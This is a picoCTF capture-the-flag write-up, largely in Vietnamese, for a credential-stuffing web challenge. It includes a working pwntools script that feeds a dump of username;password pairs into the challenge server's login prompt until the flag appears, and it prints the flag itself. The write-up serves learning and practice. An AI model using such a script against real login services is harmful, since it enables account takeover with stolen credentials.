# picoCTF - Credential Stuffing Writeup

- **Category :** Web
- **Player :** vandang0104

---

## 1. Description
*Credential stuffing is the automated injection of stolen username and password pairs (“credentials”) in to website login forms, in order to fraudulently gain access to user accounts.

Since many users will re-use the same password and username/email, when those credentials are exposed (by a database breach or phishing attack, for example) submitting those sets of stolen credentials into dozens or hundreds of other sites can allow an attacker to compromise those accounts too. Download the credentials dump here
.*

- **Link/Host:** `nc crystal-peak.picoctf.net 53611`
- **File đính kèm:** `creds-dump.txt`, `haha.py`
- **Mục tiêu:** *Bruteforce credential qua socket*

---

## 2. Recon & Analysis

1. **Khám phá ban đầu:**
   Khi kết nối vào server qua `nc`, tôi nhận được giao diện yêu cầu nhập Username và Password:
   ```text
   Username: 
   Password:

Phân tích dữ liệu được cấp:
Đề bài cung cấp một file creds-dump.txt. Mở file này ra, tôi nhận thấy cấu trúc của nó bao gồm hàng loạt tài khoản với định dạng: username;password.

Nhận định hướng tấn công:
Do có danh sách tài khoản sẵn có và cổng kết nối trực tiếp, tôi xác định hướng giải quyết bài này là viết một script Brute-force . Script này sẽ lần lượt lấy từng cặp tài khoản từ file, gửi lên server và chờ phản hồi để tìm ra thông tin đăng nhập đúng.

## 3. Exploitation

Việc copy-paste thủ công từng tài khoản là không khả thi. Ban đầu tôi định dùng Bash script (`cat users.txt | while...`), nhưng gặp vấn đề về việc kết nối netcat bị đóng quá sớm.

Do đó, tôi đã sử dụng thư viện **pwntools** trong Python để viết script tự động hóa quá trình đăng nhập.

### Exploit Script

```python
from pwn import *
import time

context.log_level = 'error'

with open('creds-dump.txt', 'r') as f:
    for line in f:
        # Lọc bỏ các dòng lỗi
        if ';' not in line: 
            continue
            
        username, password = line.strip().split(';', 1)
        print(f"[*] Đang thử: {username} - {password}")
        
        try:
            # Mở kết nối tới server (timeout 5s)
            r = remote('crystal-peak.picoctf.net', 53611, timeout=5)
            
            # Gửi username và password
            r.sendlineafter(b'Username:', username.encode())
            r.sendlineafter(b'Password:', password.encode())
            
            # Nhận toàn bộ phản hồi từ server
            response = r.recvall(timeout=2).decode(errors='ignore')
            
            # Kiểm tra xem có lấy được flag không
            if "picoCTF{" in response or "Welcome" in response:
                print("\n[+] THÀNH CÔNG!")
                print(response)
                r.close()
                break
                
            r.close()
            time.sleep(0.5)
            
        except Exception as e:
            print(f"[-] Lỗi kết nối: {e}")
            continue
```

## 4. The Flag
Sau khi chạy script khoảng vài phút, công cụ đã tìm ra thông tin đăng nhập hợp lệ và server trả về Flag:

Plaintext
 [+] THÀNH CÔNG!
 Welcome!
 picoCTF{d0nt_r3u5e_cr3d3nt1als_abfe1660}
 Flag: picoCTF{d0nt_r3u5e_cr3d3nt1als_abfe1660}
